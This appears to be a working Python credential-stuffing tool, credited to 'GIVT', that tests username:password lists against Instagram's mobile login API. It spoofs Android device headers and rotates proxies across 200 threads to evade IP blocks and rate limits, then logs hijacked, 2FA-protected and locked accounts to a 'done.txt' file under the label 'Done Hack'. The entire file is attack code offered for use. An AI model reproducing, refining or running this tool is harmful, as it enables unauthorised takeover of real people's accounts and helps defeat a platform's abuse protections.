import os
try:
    import requests
except ModuleNotFoundError:
    os.system("pip install requests")
import datetime
import random
import threading
from uuid import uuid4
import time

print("""

                 ,  ,
              #▄▓██████▀
            "▀███████████▄L
           ▄R████████████▄▄
            ▄▀█████████▓▀▀N
             ' ▀█▀███▀█ ▀
                ' ▀█▌"
                   ▐█
                   ██
                   ██
    ""▀▀▀██▄▄   ▄▄▄██▄a▄▄   ,▄▄██▀▀""
           "▀██▄⌠▀▀▀▀▀'¡▄██▀"
               ▀██▄  ▄██▀`
                  ████"
               ▄▄█▌▀╙██▄▄
          ██▄▄██▀█    █▀███▀█▌

     [ Made By GIVT ]
     [ + ] Telegram  :  @givtt
     [ + ] Instagram :  @we62
     
     [ ! ] You are not entitled to sell the Tool [ ! ]
""")
print("\n\n")
time.sleep(3)

class GIVT:
    def __init__(self):
        self.done = 0
        self.bad = 0
        self.error = 0
        self._2fa = 0
        self.max_threads_count = 200 #Never Change That

        self.proxy_list = []
        self.accounts_list = []

        self.admin()

    def clear(self):
        try:
            os_name = os.name
            if os_name == 'nt':  # Windows
                os.system('cls')
            else:  # macOS and Linux
                os.system('clear')
        except:
            print("\n\n\n\n\n\n\n")

    def write_hack_account(self, username, password, ip, action):
        with open("done.txt", "a+") as file:
            formatted_datetime = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            file.write("=" * 10 + "\n")
            file.write(f"[+] Username: {username}\n")
            file.write(f"[+] Password: {password}\n")
            file.write(f"[+] IP: {ip}\n")
            file.write(f"[+] Time: {formatted_datetime}\n")
            file.write(f"[+] Action: {action}\n")
            file.write("=" * 10 + "\n\n\n")
            file.close()

    def admin(self):
        self.read_proxy()
        self.read_accounts()
        self.clear()

        while len(self.accounts_list) != 0:
            threads = []

            for i in range(self.max_threads_count):
                line = random.choice(self.accounts_list)
                thread = threading.Thread(target=self.checker, args=(line,))
                threads.append(thread)
                thread.start()

            for thread in threads:
                thread.join()

        print("\n\n")
        print("[+] Done Read List !")
        input("")
        exit()

    def checker(self, line):
        print(f"\rDone: {self.done} | Error: {self.error} | Bad Proxy: {self.bad}", end='')
        try:
            username = line.split(":")[0]
            password = line.split(":")[1]
        except IndexError:
            self.accounts_list.remove(line)
            return 0

        url = "https://i.instagram.com/api/v1/accounts/login/"
        headers = {
            'X-Pigeon-Session-Id': str(uuid4()),
            'X-IG-Device-ID': str(uuid4()),
            'User-Agent': 'Instagram 159.0.0.40.122 Android (25/7.1.2; 240dpi; 1280x720; samsung; SM-G977N; beyond1q; qcom; en_US; 245196089)',
            'X-IG-Connection-Type': 'WIFI',
            'X-IG-Capabilities': '3brTvx8=',
            "Connection": 'keep-alive',
            "Accept-Language": "en-US",
            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
            "Accept-Encoding": "gzip, deflate",
            'Host': 'i.instagram.com',
            'Cookie': 'mid=YqejMwABAAExc4QmMCMsnq5YVuEw; csrftoken=BE0qlaD88tnB3vjkLhGksva9WFE2LPYB'
        }
        data = {
            'username': username,
            'enc_password': f"#PWD_INSTAGRAM:0:&:{password}",
            "adid": uuid4(),
            "guid": uuid4(),
            "device_id": uuid4(),
            "phone_id": uuid4(),
            "google_tokens": "[]",
            'login_attempt_count': '0'
        }
        try:
            ip = random.choice(self.proxy_list)
            proxy = {
                'http': f'http://{ip}',
                'https': f'http://{ip}'
            }
            r = requests.post(url, headers=headers, data=data, timeout=10, proxies=proxy)

            message = r.json()['error_type']
            if message == "bad_password":
                self.error +=1
                self.accounts_list_remove(line)

            elif message == "invalid_user":
                self.error +=1
                self.accounts_list_remove(line)

            elif message == "two_factor_required":
                self._2fa +=1
                self.write_hack_account(username=username, password=password, ip=ip, action="two_factor_required (2FA)")
                self.accounts_list_remove(line)

            elif message == "missing_parameters":
                self.error +=1
                self.accounts_list_remove(line)

            elif "logged_in_user" in r.text:
                self.done +=1
                self.write_hack_account(username=username, password=password, ip=ip, action="Done Hack ( done login )")
                self.accounts_list_remove(line)

            elif message == "ip_block":
                self.bad +=1

            elif message == "rate_limit_error":
                self.bad +=1

            elif message == "unusable_password":
                self.done +=1
                self.write_hack_account(username=username, password=password, ip=ip, action="Locked Account ( maybe not work )")
                self.accounts_list_remove(line)

            else:
                self.bad +=1
        except:
            self.bad +=1

    def accounts_list_remove(self, line):
        try:
            self.accounts_list.remove(line)
        except:
            pass

    def read_accounts(self):
        print("[/] Reading accounts list")
        try:
            F = open("list.txt", "r").read().splitlines()
            for x in F:
                self.accounts_list.append(x)
        except FileNotFoundError:
            input("[X] Error : File ( list.txt ) not found !")
            exit()

        print("[+] Done Read accounts list")
        self.clear()

    def read_proxy(self):
        print("[/] Reading proxy")
        try:
            F = open("proxy.txt", "r").read().splitlines()
            for x in F:
                self.proxy_list.append(x)
        except FileNotFoundError:
            input("[X] Error : File ( proxy.txt ) not found !")
            exit()

        print("[+] Done Read Proxy")
        self.clear()

GIVT()